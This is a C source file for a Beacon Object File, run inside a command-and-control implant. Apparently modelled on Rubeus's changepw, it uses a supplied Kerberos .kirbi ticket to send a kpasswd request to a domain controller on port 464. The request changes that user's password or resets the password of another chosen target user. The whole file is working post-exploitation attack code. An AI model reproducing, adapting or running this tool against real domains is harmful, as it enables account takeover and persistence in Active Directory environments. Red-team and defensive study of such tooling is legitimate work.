#include "_include/asn_decode.c"
#include "_include/asn_encode.c"
#include "_include/crypt_b64.c"
#include "_include/crypt_dec.c"
#include "_include/connection.c"

void ResetUserPassword(byte* ticket, char* newPassword, char* dc, char* targetUser, char* targetDomain) {
    int bytesSize = 0;
    byte* bytes = base64_decode(ticket, &bytesSize);

    KRB_CRED kirbi = { 0 };
    AsnElt   asn_KRB_CRED = { 0 };
    if (BytesToAsnDecode3(bytes, bytesSize, FALSE, &asn_KRB_CRED)) return;

    AsnGetKrbCred(&(asn_KRB_CRED.sub[0]), &kirbi);

    // extract the user and domain from the existing .kirbi ticket
    char* userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
    char* userDomain = kirbi.enc_part.ticket_info[0].prealm;

    if (targetUser && targetDomain)
        PRINT_OUT("[*] Resetting password for target user: %s@%s\n", targetUser, targetDomain);
    else
        PRINT_OUT("[*] Changing password for user: %s@%s\n", userName, userDomain);
    PRINT_OUT("[*] New password value: %s\n", newPassword);
    PRINT_OUT("[*] Building AP-REQ for the MS Kpassword request\n");

    AP_REQ ap_req = { 0 };

    ap_req.pvno = 5;
    ap_req.msg_type = KERB_AP_REQ;
    ap_req.ticket = kirbi.tickets[0];
    ap_req.keyUsage = KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR;
    ap_req.key = kirbi.enc_part.ticket_info[0].key;

    if (my_copybuf(&(ap_req.authenticator.crealm), userDomain, my_strlen(userDomain) + 1)) return;

    ap_req.authenticator.cname.name_count = 1;
    ap_req.authenticator.cname.name_count = PRINCIPAL_NT_PRINCIPAL;
    ap_req.authenticator.cname.name_string = MemAlloc(sizeof(void*) * ap_req.authenticator.cname.name_count);
    if (!ap_req.authenticator.cname.name_string) {
        PRINT_OUT("[x] Failed alloc memory");
        return;
    }
    if (my_copybuf(&(ap_req.authenticator.cname.name_string[0]), userName, my_strlen(userName) + 1)) return;

    DateTime dt = GetGmTimeAdd(0);

    ap_req.authenticator.authenticator_vno = 5;
    ap_req.authenticator.ctime = dt;

    // generate a random session subkey
    ap_req.authenticator.subkey.key_type = kirbi.enc_part.ticket_info[0].key.key_type;
    if (ap_req.authenticator.subkey.key_type == rc4_hmac) {
        ap_req.authenticator.subkey.key_size = 16;
    }
    else if (ap_req.authenticator.subkey.key_type == aes256_cts_hmac_sha1) {
        ap_req.authenticator.subkey.key_size = 32;
    }
    else {
        PRINT_OUT("[X] Only rc4_hmac and aes256_cts_hmac_sha1 key hashes supported at this time!\n");
        return;
    }
    ap_req.authenticator.subkey.key_value = MemAlloc(ap_req.authenticator.subkey.key_size);
    ADVAPI32$SystemFunction036(ap_req.authenticator.subkey.key_value, ap_req.authenticator.subkey.key_size);

    char* b64key = base64_encode(ap_req.authenticator.subkey.key_value, ap_req.authenticator.subkey.key_size);
    PRINT_OUT("[*] base64(session subkey): %s\n", b64key);

    // Session key used for the KRB-PRIV structure
    ADVAPI32$SystemFunction036(&(ap_req.authenticator.seq_number), 4);

    PRINT_OUT("[*] Building the KRV-PRIV structure\n");
    KRB_PRIV changePriv = { 0 };
    changePriv.pvno = 5;
    changePriv.msg_type = 21;
    changePriv.ekey = ap_req.authenticator.subkey;

    // the new password to set for the user
    if (targetUser && targetDomain) {
        StrToUpper(targetDomain);
        if (my_copybuf(&(changePriv.enc_part.username), targetUser, my_strlen(targetUser) + 1)) return ;
        if (my_copybuf(&(changePriv.enc_part.realm), targetDomain, my_strlen(targetDomain) + 1)) return ;
    }
    if (my_copybuf(&(changePriv.enc_part.new_password), newPassword, my_strlen(newPassword) + 1)) return ;
    if (my_copybuf(&(changePriv.enc_part.host_name), "lol", 4)) return ;

    // now build the final MS Kpasswd request
    AsnElt apreqAsn = { 0 };
    if (AsnApReqEncode(&ap_req, &apreqAsn))return ;
    byte* apReqBytes = NULL;
    int apReqBytesSize = 0;
    if (AsnToBytesEncode(&apreqAsn, &apReqBytesSize, &apReqBytes))return ;

    AsnElt changePrivAsn = { 0 };
    if (AsnKrbPrivEncode(&changePriv, &changePrivAsn)) return ;
    byte* changePrivBytes = NULL;
    int changePrivBytesSize = 0;
    if (AsnToBytesEncode(&changePrivAsn, &changePrivBytesSize, &changePrivBytes));

    short messageLength = (short)(apReqBytesSize + changePrivBytesSize + 6);
    short version = -128;

    byte* sendArray = MemAlloc(messageLength);
    sendArray[0] = ((byte*)(&messageLength))[1];
    sendArray[1] = ((byte*)(&messageLength))[0];
    sendArray[2] = ((byte*)(&version))[1];
    sendArray[3] = ((byte*)(&version))[0];
    sendArray[4] = ((byte*)(&apReqBytesSize))[1];
    sendArray[5] = ((byte*)(&apReqBytesSize))[0];
    MemCpy(sendArray + 6, apReqBytes, apReqBytesSize);
    MemCpy(sendArray + 6 + apReqBytesSize, changePrivBytes, changePrivBytesSize);

    // KPASSWD_DEFAULT_PORT = 464
    byte* response = NULL;
    int   responseSize = 0;
    sendBytes(dc, "464", sendArray, messageLength, &response, &responseSize);
    if (responseSize < 2)
        return ;

    short respMsgLen = 0;
    short respAPReqLen = 0;
    short respKRBPrivLen = 0;
    ((byte*)(&respMsgLen))[1] = response[0];
    ((byte*)(&respMsgLen))[0] = response[1];
    if (respMsgLen == (short)responseSize && respMsgLen > 6) {
        ((byte*)(&respAPReqLen))[1] = response[4];
        ((byte*)(&respAPReqLen))[0] = response[5];
        if (respMsgLen > 6 + respAPReqLen) {
            respKRBPrivLen = respMsgLen - 6 - respAPReqLen;

            // decode the KRB-PRIV response
            AsnElt respKRBPrivAsn = { 0 };
            if (BytesToAsnDecode3(response + 6 + respAPReqLen, respKRBPrivLen, FALSE, &respKRBPrivAsn)) return ;

            for (int i = 0; i < respKRBPrivAsn.sub[0].subCount;i++) {
                AsnElt elem = respKRBPrivAsn.sub[0].sub[i];

                if (elem.tagValue == 3) {

                    byte* encBytes = NULL;
                    int encBytesSize = 0;
                    if (AsnGetOctetString(&(elem.sub[0].sub[1]), &encBytes, &encBytesSize)) break;
                    byte* decBytes = NULL;
                    int decBytesSize = 0;
                    if (decrypt(ap_req.authenticator.subkey.key_value, ap_req.authenticator.subkey.key_type, KRB_KEY_USAGE_KRB_PRIV_ENCRYPTED_PART, encBytes, encBytesSize, &decBytes, &decBytesSize)) break;
                    AsnElt decBytesAsn = { 0 };
                    if (BytesToAsnDecode3(decBytes, decBytesSize, FALSE, &decBytesAsn)) break;

                    byte* responseCodeBytes = NULL;
                    int responseCodeBytesSize = 0;
                    if (AsnGetOctetString(&(decBytesAsn.sub[0].sub[0].sub[0]), &responseCodeBytes, &responseCodeBytesSize)) break;

                    if (responseCodeBytesSize > 1) {
                        short resultCode = 0;
                        ((byte*)(&resultCode))[1] = responseCodeBytes[0];
                        ((byte*)(&resultCode))[0] = responseCodeBytes[1];

                        if (resultCode == 0) {
                            PRINT_OUT("\n[+] Password change success!\n");
                            return;
                        }
                        else {
                            char* resultError = "";

                            if (responseCodeBytesSize > 4) {
                                if (responseCodeBytes[2] == 0 && responseCodeBytes[3] == 0) {
                                    int minPasswordLen = responseCodeBytes[7];
                                    int passwordHistory = responseCodeBytes[11];
                                    INT64 expire = 0, min_passwordage = 0;
                                    ((byte*)(&expire))[7] = responseCodeBytes[16];
                                    ((byte*)(&expire))[6] = responseCodeBytes[17];
                                    ((byte*)(&expire))[5] = responseCodeBytes[18];
                                    ((byte*)(&expire))[4] = responseCodeBytes[19];
                                    ((byte*)(&expire))[3] = responseCodeBytes[20];
                                    ((byte*)(&expire))[2] = responseCodeBytes[21];
                                    ((byte*)(&expire))[1] = responseCodeBytes[22];
                                    ((byte*)(&expire))[0] = responseCodeBytes[23];
                                    ((byte*)(&min_passwordage))[7] = responseCodeBytes[24];
                                    ((byte*)(&min_passwordage))[6] = responseCodeBytes[25];
                                    ((byte*)(&min_passwordage))[5] = responseCodeBytes[26];
                                    ((byte*)(&min_passwordage))[4] = responseCodeBytes[27];
                                    ((byte*)(&min_passwordage))[3] = responseCodeBytes[28];
                                    ((byte*)(&min_passwordage))[2] = responseCodeBytes[29];
                                    ((byte*)(&min_passwordage))[1] = responseCodeBytes[30];
                                    ((byte*)(&min_passwordage))[0] = responseCodeBytes[31];

                                    int exp = expire / 0xc92a69c000;
                                    int mp = min_passwordage / 0xc92a69c000;

                                    PRINT_OUT("\n[X] Password change error: %s\n", lookupKadminErrorCode(resultCode));
                                    PRINT_OUT("\tMinimum Password Length: %d\n", minPasswordLen);
                                    PRINT_OUT("\tPassword History: %d\n", passwordHistory);
                                    PRINT_OUT("\tExpiry: %d day(s)\n", exp);
                                    PRINT_OUT("\tMinimum Password Age: %d day(s)\n", mp);
                                }
                                else {
                                    PRINT_OUT("\n[X] Password change error: %s %s\n", lookupKadminErrorCode(resultCode), responseCodeBytes + 2);
                                }
                            }
                            else {
                                PRINT_OUT("\n[X] Password change error: %s\n", lookupKadminErrorCode(resultCode));
                            }
                        }
                    }
                }
            }
        }
    }
    PRINT_OUT("\n[x] Password not changed.\n");
}

void CHANGEPW_RUN( PCHAR Buffer, DWORD Length ) {
    PRINT_OUT("[*] Action: Reset User Password\n");

    char* dc           = NULL;
    char* targetUser   = NULL;
    char* targetDomain = NULL;
    char* newPassword  = NULL;
    byte* ticket       = NULL;

    for (int i = 0; i < Length; i++) {
        i += GetStrParam(Buffer + i, Length - i, "/dc:", 4, &dc);
        i += GetStrParam(Buffer + i, Length - i, "/ticket:", 8, &ticket);
        i += GetStrParam(Buffer + i, Length - i, "/targetuser:", 12, &targetUser);
        i += GetStrParam(Buffer + i, Length - i, "/targetdomain:", 14, &targetDomain);
        i += GetStrParam(Buffer + i, Length - i, "/new:", 5, &newPassword);
    }

    GetDomainInfo(NULL, &dc);
    if (dc == NULL) {
        PRINT_OUT("[X] Could not retrieve domain information!\n\n");
        return;
    }

    if (newPassword == NULL) {
        PRINT_OUT("\n[X] New password must be supplied with /new:X !\n");
        return;
    }

    if (ticket)
        ResetUserPassword(ticket, newPassword, dc, targetUser, targetDomain);
    else
        PRINT_OUT("\n[X] A /ticket:X needs to be supplied!\n");
}

VOID go( IN PCHAR Buffer, IN ULONG Length ) {
    INIT_BOF();

    datap parser;
    BeaconDataParse(&parser, Buffer, Length);
    DWORD PARAM_SIZE = 0;
    PBYTE PARAM = BeaconDataExtract(&parser, &PARAM_SIZE);

    if( LoadFunc() )
        PRINT_OUT("%s\n", "Modules not loaded");
    else
        CHANGEPW_RUN( PARAM, PARAM_SIZE );

    FreeBank();

    END_BOF();
}